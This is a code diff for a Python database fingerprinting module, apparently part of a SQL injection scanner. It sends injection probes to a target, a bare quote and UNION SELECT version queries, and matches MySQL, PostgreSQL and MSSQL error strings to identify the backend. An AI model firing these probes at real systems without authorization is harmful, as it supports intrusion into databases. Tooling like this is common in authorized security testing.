@@ -1,83 +1,139 @@
 #!/usr/bin/env python3
 
-import re
-from typing import Dict, Any, List
 import logging
-from .request_engine import RequestEngine
+import re
+from typing import Dict, Optional, Tuple
+from core.request_engine import RequestEngine
 
 class DatabaseFingerprinter:
-    def __init__(self):
-        """Initialize database fingerprinter with common database signatures."""
+    def __init__(self, request_engine: RequestEngine):
+        """Initialize the database fingerprinter with a request engine."""
+        self.request_engine = request_engine
         self.db_signatures = {
-            "mysql": [
-                r"mysql",
-                r"you have an error in your sql syntax",
-                r"warning: mysql_",
-                r"valid mysql result",
-                r"check the manual that corresponds to your (mysql|mariadb) server version"
-            ],
-            "postgresql": [
-                r"postgresql",
-                r"pg_",
-                r"postgres",
-                r"psql",
-                r"valid postgresql result"
-            ],
-            "mssql": [
-                r"microsoft sql server",
-                r"sql server",
-                r"mssql",
-                r"valid mssql result",
-                r"odbc sql server driver"
-            ]
+            "mysql": {
+                "error": [
+                    "You have an error in your SQL syntax",
+                    "check the manual that corresponds to your MySQL server version",
+                    "MySQL server version",
+                    "Warning: mysql_",
+                    "valid MySQL result",
+                    "check the manual that corresponds to your MariaDB server version",
+                    "MySqlException"
+                ],
+                "version": [
+                    "SELECT VERSION()",
+                    "SELECT @@version",
+                    "SELECT version()"
+                ]
+            },
+            "postgresql": {
+                "error": [
+                    "PostgreSQL",
+                    "pg_",
+                    "PSQLException",
+                    "ERROR: syntax error at or near",
+                    "ERROR: invalid input syntax for",
+                    "ERROR: column",
+                    "ERROR: relation",
+                    "ERROR: function"
+                ],
+                "version": [
+                    "SELECT version()",
+                    "SHOW server_version"
+                ]
+            },
+            "mssql": {
+                "error": [
+                    "Microsoft SQL Server",
+                    "SQLServer JDBC Driver",
+                    "ODBC SQL Server Driver",
+                    "SQLServerException",
+                    "Warning: mssql_",
+                    "Msg \d+, Level \d+, State \d+",
+                    "Line \d+: Incorrect syntax near"
+                ],
+                "version": [
+                    "SELECT @@version",
+                    "SELECT SERVERPROPERTY('productversion')"
+                ]
+            }
         }
-        
-        self.version_patterns = {
-            "mysql": r"mysql.*?(\d+\.\d+\.\d+)",
-            "postgresql": r"postgresql.*?(\d+\.\d+)",
-            "mssql": r"microsoft sql server.*?(\d+\.\d+\.\d+)"
-        }
-        
-    def fingerprint(self, request_engine: RequestEngine) -> Dict[str, Any]:
+    
+    def fingerprint(self) -> str:
         """Detect database type and version."""
         try:
-            # Test payloads for version detection
-            version_payloads = {
-                "mysql": "' UNION SELECT version() --",
-                "postgresql": "' UNION SELECT version() --",
-                "mssql": "' UNION SELECT @@version --"
-            }
+            # Try error-based detection first
+            db_type = self._detect_by_error()
+            if db_type:
+                return db_type
             
-            detected_db = None
-            version = None
+            # Try version-based detection
+            db_type, version = self._detect_by_version()
+            if db_type:
+                return f"{db_type} {version}" if version else db_type
             
-            # Try each database type
-            for db_type, payload in version_payloads.items():
-                response, _ = request_engine.send_request(payload=payload)
-                
-                if not response:
-                    continue
-                    
-                # Check for database signatures
-                body = response.text.lower()
-                for signature in self.db_signatures[db_type]:
-                    if re.search(signature, body):
-                        detected_db = db_type
-                        break
-                        
-                # Try to extract version
-                if detected_db:
-                    version_match = re.search(self.version_patterns[db_type], body)
-                    if version_match:
-                        version = version_match.group(1)
-                    break
-                    
-            return {
-                "detected": detected_db is not None,
-                "type": detected_db or "unknown",
-                "version": version
-            }
+            return "unknown"
             
         except Exception as e:
             logging.error(f"Database fingerprinting failed: {str(e)}")
-            return {"detected": False, "type": "unknown", "version": None} 
+            return "unknown"
+    
+    def _detect_by_error(self) -> Optional[str]:
+        """Detect database type by error messages."""
+        try:
+            # Send a request with a SQL syntax error
+            payload = "'"
+            response, _ = self.request_engine.send_request(payload)
+            
+            if not response:
+                return None
+            
+            # Check response for database-specific error messages
+            for db_type, signatures in self.db_signatures.items():
+                for error_pattern in signatures["error"]:
+                    if re.search(error_pattern, response.text, re.IGNORECASE):
+                        logging.info(f"Detected {db_type} by error message")
+                        return db_type
+            
+            return None
+            
+        except Exception as e:
+            logging.error(f"Error-based detection failed: {str(e)}")
+            return None
+    
+    def _detect_by_version(self) -> Tuple[Optional[str], Optional[str]]:
+        """Detect database type and version by version queries."""
+        try:
+            for db_type, signatures in self.db_signatures.items():
+                for version_query in signatures["version"]:
+                    payload = f"' UNION SELECT {version_query}--"
+                    response, _ = self.request_engine.send_request(payload)
+                    
+                    if not response:
+                        continue
+                    
+                    # Look for version information in response
+                    version_match = re.search(r'\d+\.\d+\.\d+', response.text)
+                    if version_match:
+                        logging.info(f"Detected {db_type} version {version_match.group()}")
+                        return db_type, version_match.group()
+            
+            return None, None
+            
+        except Exception as e:
+            logging.error(f"Version-based detection failed: {str(e)}")
+            return None, None
+    
+    def get_database_info(self) -> Dict[str, str]:
+        """Get detailed database information."""
+        db_type = self.fingerprint()
+        
+        if db_type == "unknown":
+            return {"type": "unknown", "version": "unknown"}
+        
+        # Split type and version if available
+        if " " in db_type:
+            type_, version = db_type.split(" ", 1)
+            return {"type": type_, "version": version}
+        
+        return {"type": db_type, "version": "unknown"} 
